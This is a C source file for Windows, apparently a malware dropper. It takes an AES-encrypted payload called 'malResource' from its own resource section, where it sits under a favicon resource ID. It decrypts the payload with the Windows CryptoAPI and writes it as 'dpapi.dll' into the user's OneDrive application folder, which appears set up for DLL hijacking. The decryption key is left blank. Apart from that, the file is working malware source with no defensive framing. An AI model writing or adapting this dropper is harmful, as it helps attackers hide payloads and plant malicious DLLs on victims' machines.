// by Abdulaziz Almetairy
// Github.com/oh-az

#include <windows.h>
#include "resources.h"
#include <wincrypt.h>
#pragma comment (lib, "advapi32")
#pragma comment (lib, "crypt32.lib")

int AESDecrypt(char * malResource, unsigned int malResource_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, malResource, &malResource_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

int main(void) {
    

	HANDLE hFile;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	char * pathToExe= strcat(getenv("USERPROFILE"),"\\AppData\\Local\\Microsoft\\OneDrive\\dpapi.dll");
	unsigned char * malResource;
	unsigned int malResource_len;
	DWORD BytesWritten = 0;
	BOOL writeStatus;
	
	// Extract DLL from resource section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	malResource = (char *) LockResource(resHandle);
	malResource_len = SizeofResource(NULL, res);

	char key[] = //Decryption Key
 	
 	//Decrypt Resource
	AESDecrypt((char *)malResource, malResource_len, key, sizeof(key));

	// Create new file using the path we provided.
    hFile = CreateFile(pathToExe,                // name of the write
                       GENERIC_WRITE,          // open for writing
                       0,                      // do not share
                       NULL,                   // default security
                       CREATE_ALWAYS,             // create new file even if it exists
                       FILE_ATTRIBUTE_NORMAL,  // normal file
                       NULL);                  // no attr. template

    // Write to the file
    writeStatus = WriteFile( 
				hFile,           // open file handle
                malResource,      // start of data to write
                malResource_len,  // number of bytes to write
                &BytesWritten, // number of bytes that were written
                NULL);            // no overlapped structure

    CloseHandle(hFile);
}
